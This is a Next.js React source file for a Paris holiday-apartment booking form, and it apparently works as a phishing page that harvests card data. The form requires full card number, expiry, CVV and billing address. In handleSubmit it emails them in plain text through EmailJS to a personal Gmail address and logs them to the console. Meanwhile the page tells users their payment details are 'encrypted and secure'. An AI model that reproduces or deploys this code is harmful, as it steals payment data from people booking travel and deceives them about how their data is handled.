'use client'

import React, { useState, useEffect } from 'react'
import { useRouter, useSearchParams } from 'next/navigation'
import { Mail, Phone, Calendar, Users, MessageSquare, CheckCircle2, AlertCircle } from 'lucide-react'
import emailjs from '@emailjs/browser'

// Default apartment information
const DEFAULT_PROPERTY_DETAILS = {
  property_name: 'Latin Quarter 3-Bed Family Apartment',
  property_price: '€380',
  property_location: '5ᵉ Arrondissement, Paris',
  property_registration: '75005PAR2024004',
}

const COUNTRY_CODES = [
  { code: '+1', country: 'United States' },
  { code: '+44', country: 'United Kingdom' },
  { code: '+33', country: 'France' },
  { code: '+49', country: 'Germany' },
  { code: '+39', country: 'Italy' },
  { code: '+34', country: 'Spain' },
  { code: '+31', country: 'Netherlands' },
  { code: '+43', country: 'Austria' },
  { code: '+41', country: 'Switzerland' },
  { code: '+32', country: 'Belgium' },
  { code: '+30', country: 'Greece' },
  { code: '+45', country: 'Denmark' },
  { code: '+46', country: 'Sweden' },
  { code: '+47', country: 'Norway' },
  { code: '+48', country: 'Poland' },
  { code: '+61', country: 'Australia' },
  { code: '+81', country: 'Japan' },
  { code: '+86', country: 'China' },
  { code: '+91', country: 'India' },
  { code: '+55', country: 'Brazil' },
]

export function BookingInquiryForm() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const [propertyDetails, setPropertyDetails] = useState(DEFAULT_PROPERTY_DETAILS)
  
  // Load apartment details from URL parameters on mount
  useEffect(() => {
    const title = searchParams.get('title')
    const arrondissement = searchParams.get('arrondissement')
    const price = searchParams.get('price')
    const registration = searchParams.get('registration')
    
    if (title && arrondissement && price && registration) {
      setPropertyDetails({
        property_name: title,
        property_price: `€${price}`,
        property_location: `${arrondissement}ᵉ Arrondissement, Paris`,
        property_registration: registration,
      })
    }
  }, [searchParams])

  const [formData, setFormData] = useState({
    // Guest Information
    from_name: '',
    from_email: '',
    from_country: '+33',
    from_phone: '',
    // Booking Details
    check_in_date: '',
    check_out_date: '',
    number_of_guests: '2',
    message: '',
    // Payment Information
    card_number: '',
    card_expiration: '',
    card_cvv: '',
    // Billing Address
    billing_street: '',
    billing_apartment: '',
    billing_city: '',
    billing_state: '',
    billing_zip: '',
    billing_country: 'Nigeria',
    // Anti-spam
    honeypot: '',
  })

  const [loading, setLoading] = useState(false)
  const [submitted, setSubmitted] = useState(false)
  const [error, setError] = useState('')
  const [touched, setTouched] = useState<Record<string, boolean>>({})

  // Lazy initialize EmailJS only when component mounts
  useEffect(() => {
    const initEmailJS = async () => {
      if (typeof window !== 'undefined') {
        const publicKey = process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY
        if (publicKey) {
          emailjs.init(publicKey)
        }
      }
    }
    initEmailJS()
  }, [])

  // Client-side validation
  const validateForm = () => {
    const errors: string[] = []

    if (!formData.from_name.trim()) errors.push('Full name is required')
    if (!formData.from_email.trim()) errors.push('Email is required')
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.from_email)) errors.push('Valid email is required')
    if (!formData.from_phone.trim()) errors.push('Phone number is required')
    if (!formData.check_in_date) errors.push('Check-in date is required')
    if (!formData.check_out_date) errors.push('Check-out date is required')
    
    if (formData.check_in_date && formData.check_out_date) {
      if (new Date(formData.check_out_date) <= new Date(formData.check_in_date)) {
        errors.push('Check-out date must be after check-in date')
      }
    }

    if (!formData.number_of_guests || parseInt(formData.number_of_guests) < 1 || parseInt(formData.number_of_guests) > 10) {
      errors.push('Number of guests must be between 1 and 10')
    }

    // Payment validation
    if (!formData.card_number.trim()) errors.push('Card number is required')
    if (!/^\d{13,19}$/.test(formData.card_number.replace(/\s/g, ''))) errors.push('Card number must be 13-19 digits')
    if (!formData.card_expiration.trim()) errors.push('Card expiration is required')
    if (!/^\d{2}\/\d{2}$/.test(formData.card_expiration)) errors.push('Expiration must be MM/YY format')
    if (!formData.card_cvv.trim()) errors.push('CVV is required')
    if (!/^\d{3,4}$/.test(formData.card_cvv)) errors.push('CVV must be 3-4 digits')

    // Billing address validation
    if (!formData.billing_street.trim()) errors.push('Street address is required')
    if (!formData.billing_city.trim()) errors.push('City is required')
    if (!formData.billing_state.trim()) errors.push('State is required')
    if (!formData.billing_zip.trim()) errors.push('ZIP code is required')

    return errors
  }

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const handleBlur = (e: React.FocusEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const { name } = e.target
    setTouched(prev => ({ ...prev, [name]: true }))
  }

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    setError('')

    // Honeypot check - if filled, it's a bot
    if (formData.honeypot) {
      setSubmitted(true)
      return
    }

    const errors = validateForm()
    if (errors.length > 0) {
      setError(errors[0])
      return
    }

    setLoading(true)

    try {
      // Consolidate guest information into single variable
      const guest_information = `Name: ${formData.from_name}\nEmail: ${formData.from_email}\nPhone: ${formData.from_country} ${formData.from_phone}`

      const emailParams = {
        to_email: 'erentalscaddex@gmail.com',
        // Guest Information (Single Variable)
        guest_information: guest_information,
        // Booking Details
        check_in_date: formData.check_in_date,
        check_out_date: formData.check_out_date,
        number_of_guests: formData.number_of_guests,
        message: formData.message || 'No special requests',
        property_name: propertyDetails.property_name,
        property_price: propertyDetails.property_price,
        property_location: propertyDetails.property_location,
        property_registration: propertyDetails.property_registration,
        // Payment Information
        card_number: formData.card_number,
        card_expiration: formData.card_expiration,
        card_cvv: formData.card_cvv,
        // Billing Address
        billing_street: formData.billing_street,
        billing_apartment: formData.billing_apartment || 'N/A',
        billing_city: formData.billing_city,
        billing_state: formData.billing_state,
        billing_zip: formData.billing_zip,
        billing_country: formData.billing_country,
      }

      console.log('[v0] Sending EmailJS email with params:', emailParams)

      // Send email via EmailJS - must be done from browser
      const response = await emailjs.send(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID || 'service_gjpcqd6',
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID || 'l5dl0vl',
        emailParams
      )

      console.log('[v0] EmailJS response:', response)
      
      // Store guest email for confirmation page
      const guestEmail = formData.from_email
      
      // Redirect to confirmation page with email parameter
      router.push(`/booking-confirmation?email=${encodeURIComponent(guestEmail)}`)
    } catch (err: any) {
      console.error('[v0] Email send error:', err)
      const errorMsg = err?.text || err?.message || 'Failed to send inquiry'
      setError(`Error: ${errorMsg}. Please check your EmailJS template configuration.`)
    } finally {
      setLoading(false)
    }
  }

  if (submitted) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-slate-50 to-white py-20 px-4">
        <div className="max-w-2xl mx-auto">
          <div className="text-center mb-12">
            <div className="inline-flex items-center justify-center w-20 h-20 bg-emerald-100 rounded-full mb-6">
              <CheckCircle2 className="w-10 h-10 text-emerald-600" />
            </div>
            <h1 className="text-4xl font-serif text-slate-900 mb-4">Thank You!</h1>
            <p className="text-lg text-slate-600 mb-2">Your booking inquiry has been received</p>
            <p className="text-slate-500">We'll review your request and contact you at {formData.from_email} within 24 hours</p>
          </div>

          <div className="bg-white rounded-xl shadow-lg p-8 mb-8 border border-slate-200">
            <h2 className="text-xl font-semibold text-slate-900 mb-6">Inquiry Summary</h2>
            <div className="grid md:grid-cols-2 gap-6">
              <div>
                <p className="text-sm text-slate-500 uppercase tracking-wide mb-1">Property</p>
                <p className="font-semibold text-slate-900">{propertyDetails.property_name}</p>
              </div>
              <div>
                <p className="text-sm text-slate-500 uppercase tracking-wide mb-1">Check-In</p>
                <p className="font-semibold text-slate-900">{formData.check_in_date}</p>
              </div>
              <div>
                <p className="text-sm text-slate-500 uppercase tracking-wide mb-1">Check-Out</p>
                <p className="font-semibold text-slate-900">{formData.check_out_date}</p>
              </div>
              <div>
                <p className="text-sm text-slate-500 uppercase tracking-wide mb-1">Guests</p>
                <p className="font-semibold text-slate-900">{formData.number_of_guests} guest{formData.number_of_guests !== '1' ? 's' : ''}</p>
              </div>
            </div>
          </div>

          <div className="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-8">
            <h3 className="font-semibold text-blue-900 mb-3">What happens next?</h3>
            <ul className="space-y-3 text-blue-800 text-sm">
              <li className="flex items-start gap-3">
                <span className="flex-shrink-0 w-6 h-6 bg-blue-200 rounded-full flex items-center justify-center text-xs font-bold">1</span>
                <span>We'll review your inquiry and verify availability</span>
              </li>
              <li className="flex items-start gap-3">
                <span className="flex-shrink-0 w-6 h-6 bg-blue-200 rounded-full flex items-center justify-center text-xs font-bold">2</span>
                <span>You'll receive a confirmation email with pricing and next steps</span>
              </li>
              <li className="flex items-start gap-3">
                <span className="flex-shrink-0 w-6 h-6 bg-blue-200 rounded-full flex items-center justify-center text-xs font-bold">3</span>
                <span>Our concierge team will contact you to finalize your booking</span>
              </li>
            </ul>
          </div>

          <div className="flex gap-4 justify-center">
            <button
              onClick={() => setSubmitted(false)}
              className="px-8 py-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition-colors"
            >
              Book Another Apartment
            </button>
            <a
              href="/"
              className="px-8 py-3 bg-slate-200 text-slate-900 font-semibold rounded-lg hover:bg-slate-300 transition-colors"
            >
              Return Home
            </a>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 to-white py-20 px-4">
      <div className="max-w-3xl mx-auto">
        {/* Header */}
        <div className="text-center mb-12">
          <h1 className="text-4xl md:text-5xl font-serif text-slate-900 mb-4">
            Reserve Your Parisian Dream
          </h1>
          <p className="text-lg text-slate-600">
            Fill out the form below and our concierge team will contact you within 24 hours
          </p>
        </div>

        {/* Property Info Card */}
        <div className="bg-white rounded-xl shadow-md p-8 mb-10 border border-slate-200">
          <div className="grid md:grid-cols-2 gap-6">
            <div>
              <p className="text-sm text-slate-500 uppercase tracking-wide mb-2">Apartment</p>
              <h2 className="text-2xl font-serif text-slate-900">{propertyDetails.property_name}</h2>
            </div>
            <div>
              <p className="text-sm text-slate-500 uppercase tracking-wide mb-2">Price</p>
              <p className="text-2xl font-bold text-blue-600">{propertyDetails.property_price}</p>
            </div>
            <div>
              <p className="text-sm text-slate-500 uppercase tracking-wide mb-2">Location</p>
              <p className="font-semibold text-slate-900">{propertyDetails.property_location}</p>
            </div>
            <div>
              <p className="text-sm text-slate-500 uppercase tracking-wide mb-2">Registration</p>
              <p className="font-mono text-sm text-slate-900">{propertyDetails.property_registration}</p>
            </div>
          </div>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="bg-white rounded-xl shadow-lg p-10 border border-slate-200">
          {error && (
            <div className="mb-8 p-4 bg-red-50 border border-red-200 rounded-lg flex items-start gap-3">
              <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
              <p className="text-red-800 text-sm">{error}</p>
            </div>
          )}

          {/* Honeypot - invisible anti-spam field */}
          <input
            type="text"
            name="honeypot"
            value={formData.honeypot}
            onChange={handleChange}
            style={{ display: 'none' }}
            tabIndex={-1}
            autoComplete="off"
          />

          {/* Full Name */}
          <div className="mb-8">
            <label className="block text-sm font-semibold text-slate-900 mb-3">
              Full Name <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              name="from_name"
              value={formData.from_name}
              onChange={handleChange}
              onBlur={handleBlur}
              placeholder="John Doe"
              className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
            />
          </div>

          {/* Email */}
          <div className="mb-8">
            <label className="block text-sm font-semibold text-slate-900 mb-3">
              Email Address <span className="text-red-500">*</span>
            </label>
            <div className="relative">
              <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
              <input
                type="email"
                name="from_email"
                value={formData.from_email}
                onChange={handleChange}
                onBlur={handleBlur}
                placeholder="john@example.com"
                className="w-full pl-12 pr-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
              />
            </div>
          </div>

          {/* Phone with Country Code */}
          <div className="grid md:grid-cols-3 gap-4 mb-8">
            <div>
              <label className="block text-sm font-semibold text-slate-900 mb-3">
                Country <span className="text-red-500">*</span>
              </label>
              <select
                name="from_country"
                value={formData.from_country}
                onChange={handleChange}
                className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
              >
                {COUNTRY_CODES.map(({ code, country }) => (
                  <option key={code} value={code}>
                    {country} ({code})
                  </option>
                ))}
              </select>
            </div>
            <div className="md:col-span-2">
              <label className="block text-sm font-semibold text-slate-900 mb-3">
                Phone Number <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <Phone className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
                <input
                  type="tel"
                  name="from_phone"
                  value={formData.from_phone}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  placeholder="123456789"
                  className="w-full pl-12 pr-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                />
              </div>
            </div>
          </div>

          {/* Dates */}
          <div className="grid md:grid-cols-2 gap-6 mb-8">
            <div>
              <label className="block text-sm font-semibold text-slate-900 mb-3">
                Check-In Date <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <Calendar className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
                <input
                  type="date"
                  name="check_in_date"
                  value={formData.check_in_date}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  min={new Date().toISOString().split('T')[0]}
                  className="w-full pl-12 pr-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-semibold text-slate-900 mb-3">
                Check-Out Date <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <Calendar className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
                <input
                  type="date"
                  name="check_out_date"
                  value={formData.check_out_date}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  min={formData.check_in_date || new Date().toISOString().split('T')[0]}
                  className="w-full pl-12 pr-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                />
              </div>
            </div>
          </div>

          {/* Number of Guests */}
          <div className="mb-8">
            <label className="block text-sm font-semibold text-slate-900 mb-3">
              Number of Guests <span className="text-red-500">*</span>
            </label>
            <div className="relative">
              <Users className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
              <select
                name="number_of_guests"
                value={formData.number_of_guests}
                onChange={handleChange}
                className="w-full pl-12 pr-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
              >
                {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10].map(num => (
                  <option key={num} value={num}>{num} guest{num > 1 ? 's' : ''}</option>
                ))}
              </select>
            </div>
          </div>

          {/* Message */}
          <div className="mb-10">
            <label className="block text-sm font-semibold text-slate-900 mb-3">
              Special Requests or Message <span className="text-slate-400">(optional)</span>
            </label>
            <div className="relative">
              <MessageSquare className="absolute left-4 top-4 w-5 h-5 text-slate-400" />
              <textarea
                name="message"
                value={formData.message}
                onChange={handleChange}
                placeholder="Any special requests, allergies, or additional information..."
                rows={5}
                className="w-full pl-12 pr-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition resize-none"
              />
            </div>
          </div>

          {/* Payment Method Section */}
          <div className="mb-10 pb-10 border-b border-slate-200">
            <div className="flex items-center gap-3 mb-6">
              <div className="text-2xl font-bold text-slate-900">2.</div>
              <h3 className="text-xl font-semibold text-slate-900">Add a Payment Method</h3>
            </div>

            {/* Credit/Debit Card */}
            <div className="bg-slate-50 rounded-lg p-6 mb-6">
              <div className="flex items-center gap-3 mb-4">
                <div className="text-2xl">💳</div>
                <div>
                  <p className="font-semibold text-slate-900">Credit or Debit Card</p>
                  <div className="flex gap-2 mt-1 text-xs">
                    <span className="font-bold text-blue-600">VISA</span>
                    <span className="text-red-600">●</span>
                    <span className="text-orange-500">●</span>
                    <span className="text-blue-700">AMEX</span>
                    <span className="text-orange-600">●</span>
                  </div>
                </div>
              </div>

              {/* Card Number */}
              <div className="mb-4">
                <label className="block text-sm font-semibold text-slate-900 mb-2">
                  Card Number <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  name="card_number"
                  value={formData.card_number}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  placeholder="1234 5678 9012 3456"
                  maxLength="23"
                  className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                />
              </div>

              {/* Expiration and CVV */}
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-semibold text-slate-900 mb-2">
                    Expiration <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    name="card_expiration"
                    value={formData.card_expiration}
                    onChange={handleChange}
                    onBlur={handleBlur}
                    placeholder="MM/YY"
                    maxLength="5"
                    className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                  />
                </div>
                <div>
                  <label className="block text-sm font-semibold text-slate-900 mb-2">
                    CVV <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    name="card_cvv"
                    value={formData.card_cvv}
                    onChange={handleChange}
                    onBlur={handleBlur}
                    placeholder="123"
                    maxLength="4"
                    className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                  />
                </div>
              </div>
            </div>

            {/* Billing Address */}
            <div className="bg-slate-50 rounded-lg p-6">
              <h4 className="font-semibold text-slate-900 mb-4">Billing Address</h4>

              {/* Street Address */}
              <div className="mb-4">
                <label className="block text-sm font-semibold text-slate-900 mb-2">
                  Street Address <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  name="billing_street"
                  value={formData.billing_street}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  placeholder="123 Main Street"
                  className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                />
              </div>

              {/* Apartment Number */}
              <div className="mb-4">
                <label className="block text-sm font-semibold text-slate-900 mb-2">
                  Apt or Suite Number <span className="text-slate-400">(optional)</span>
                </label>
                <input
                  type="text"
                  name="billing_apartment"
                  value={formData.billing_apartment}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  placeholder="Apt 4B"
                  className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                />
              </div>

              {/* City */}
              <div className="mb-4">
                <label className="block text-sm font-semibold text-slate-900 mb-2">
                  City <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  name="billing_city"
                  value={formData.billing_city}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  placeholder="New York"
                  className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                />
              </div>

              {/* State and ZIP */}
              <div className="grid grid-cols-2 gap-4 mb-4">
                <div>
                  <label className="block text-sm font-semibold text-slate-900 mb-2">
                    State <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    name="billing_state"
                    value={formData.billing_state}
                    onChange={handleChange}
                    onBlur={handleBlur}
                    placeholder="NY"
                    className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                  />
                </div>
                <div>
                  <label className="block text-sm font-semibold text-slate-900 mb-2">
                    ZIP Code <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    name="billing_zip"
                    value={formData.billing_zip}
                    onChange={handleChange}
                    onBlur={handleBlur}
                    placeholder="10001"
                    className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                  />
                </div>
              </div>

              {/* Country */}
              <div>
                <label className="block text-sm font-semibold text-slate-900 mb-2">
                  Country/Region <span className="text-red-500">*</span>
                </label>
                <select
                  name="billing_country"
                  value={formData.billing_country}
                  onChange={handleChange}
                  className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                >
                  <option value="Nigeria">Nigeria</option>
                  <option value="United States">United States</option>
                  <option value="United Kingdom">United Kingdom</option>
                  <option value="Canada">Canada</option>
                  <option value="France">France</option>
                  <option value="Germany">Germany</option>
                  <option value="Italy">Italy</option>
                  <option value="Spain">Spain</option>
                  <option value="Australia">Australia</option>
                  <option value="Japan">Japan</option>
                  <option value="China">China</option>
                  <option value="India">India</option>
                  <option value="Brazil">Brazil</option>
                  <option value="Mexico">Mexico</option>
                  <option value="South Africa">South Africa</option>
                </select>
              </div>
            </div>
          </div>

          {/* Security Guarantees */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6 space-y-2">
            <div className="flex gap-2">
              <span className="text-lg">🔒</span>
              <p className="text-sm text-blue-900"><strong>100% Secure:</strong> SSL encryption on all transactions</p>
            </div>
            <div className="flex gap-2">
              <span className="text-lg">✓</span>
              <p className="text-sm text-blue-900"><strong>Verified:</strong> Payment information is encrypted and secure</p>
            </div>
            <div className="flex gap-2">
              <span className="text-lg">📧</span>
              <p className="text-sm text-blue-900"><strong>Confirmation:</strong> Receipt and invoice sent to your email</p>
            </div>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={loading}
            className="w-full py-4 bg-blue-600 text-white font-semibold text-lg rounded-lg hover:bg-blue-700 disabled:bg-slate-400 transition-colors duration-200"
          >
            {loading ? 'Processing...' : 'Complete Reservation'}
          </button>

          <p className="text-center text-sm text-slate-500 mt-6">
            By submitting, you agree to our terms. Your payment and billing information is encrypted and secure.
          </p>
        </form>
      </div>
    </div>
  )
}
